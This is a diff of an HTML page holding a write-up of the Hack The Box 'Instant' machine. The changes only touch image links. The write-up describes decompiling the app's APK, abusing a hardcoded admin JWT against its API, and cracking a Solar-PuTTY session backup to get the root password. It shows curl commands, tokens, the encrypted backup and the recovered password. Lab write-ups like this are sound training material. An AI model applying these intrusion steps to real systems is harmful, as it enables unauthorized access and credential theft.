@@ -41,14 +41,14 @@
           </div>
         </header>
         <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
-<p><img src="/_resources/4e40075c260949eca386741700fa4c34.png" /></p>
+<p><img src=":/4e40075c260949eca386741700fa4c34" alt="1e9701d04f6a3e87fa0d48c780926091.png" /></p>
 <p>Clicking the download button gets us an .apk file. Dirsearch finds some dirs, but we can’t access any of them.</p>
-<p><img src="/_resources/9ad8e9a61b674c22bcbe9c0db359a669.png" /></p>
+<p><img src=":/9ad8e9a61b674c22bcbe9c0db359a669" alt="9cc4077ac4973eff79cca538732a1900.png" /></p>
 <p>All of the subdomains give 301 to the main site, except for swagger-ui.instant.htb, which redirects to /apidocs.</p>
 <h1 id="apk-file">Apk file</h1>
 <p>Let’s get back to the .apk file. We can unzip it. I realized that I dont know what to look for, so started searching for anything for .apk file analysis. After a while I’ve found <a title="https://github.com/MobSF/Mobile-Security-Framework-MobSF" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a>, which looked pretty good. It decompiled app’s code and allowed me to find the log in mechanism.</p>
 <p><code>http://mywalletv1.instant.htb/api/v1/login</code><br />
-<img src="/_resources/da09035730034e6d9b50d8d10c46eab3.png" /></p>
+<img src=":/da09035730034e6d9b50d8d10c46eab3" alt="22903792fd73cd78ca9fbc8f3ae14360.png" /></p>
 <p>We can now test if the api works.</p>
 <div><pre class="hljs"><code><span class="hljs-variable">$curl</span> -X POST http://mywalletv1.instant.htb/api/v1/login \
     -H <span class="hljs-string">"Content-Type: application/json"</span> \
@@ -123,7 +123,7 @@ Running post on /login gets us <code>&lt;p&gt;Did not attempt to load JSON data 
          
 {<span class="hljs-string">"Access-Token"</span>:<span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mywicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6IjA1N2YxMTBlLTA0ZDEtNGNiYi05Yzk5LTRmNzU3MDZhMjRjMiIsImV4cCI6MTcyODg2MDIyOH0.XYeSjK9JEZFi1d_xwBq1fHa0DZ04TiMt0md5NVsWwAo"</span>,<span class="hljs-string">"Status"</span>:201}</code></pre></div>
 <p>I was stumbling for way too long, until I realized that apidocs site exists under <code>http://swagger-ui.instant.htb/apidocs/</code>. In there I found documentation explaining, how we can read files.</p>
-<p><img src="/_resources/af25ed64da4042baa04ddf00e8cf808f.png" /></p>
+<p><img src=":/af25ed64da4042baa04ddf00e8cf808f" alt="b81c8528d111f25dfcab83cd2e11daf8.png" /></p>
 <p>So I added the admin token I have found in an app and it worked!</p>
 <div><pre class="hljs"><code>┌─[user@parrot]─[~]
 └──╼ <span class="hljs-variable">$curl</span> -X GET <span class="hljs-string">"http://swagger-ui.instant.htb/api/v1/admin/view/logs"</span> -H  <span class="hljs-string">"accept: application/json"</span> -H  <span class="hljs-string">"Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</span>
@@ -145,9 +145,9 @@ Solar-PuTTY</code></pre></div>
 <div><pre class="hljs"><code>shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat 
 ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=</code></pre></div>
 <p>So simple duckduckgo search for <code>solar-PuTTy getting data from .dat file</code> got me <a title="https://github.com/Vz0n/SolarPuttyBrute" href="https://github.com/Vz0n/SolarPuttyBrute">SolarPuTTYBrute</a>. So I downloaded Visual Studio, compiled it and run with rockyou.txt.</p>
-<p><img src="/_resources/19b075f4bcbf4fb599c1356af8e4c750.png" /></p>
+<p><img src=":/19b075f4bcbf4fb599c1356af8e4c750" alt="d66abb8e73dd577bb5ae5860d057c3ae.png" /></p>
 <p>It worked, tried to log in as root on the linux machine with the pass <code>12**24nzC!r0c%q12</code>.</p>
-<p><img src="/_resources/4f2d1c9a20fb48a397017cf393373c92.png" /></p>
+<p><img src=":/4f2d1c9a20fb48a397017cf393373c92" alt="a5562440661445cea540663821032c21.png" /></p>
 <p>We are done here. Easy root.</p>
 </div>
       </article>
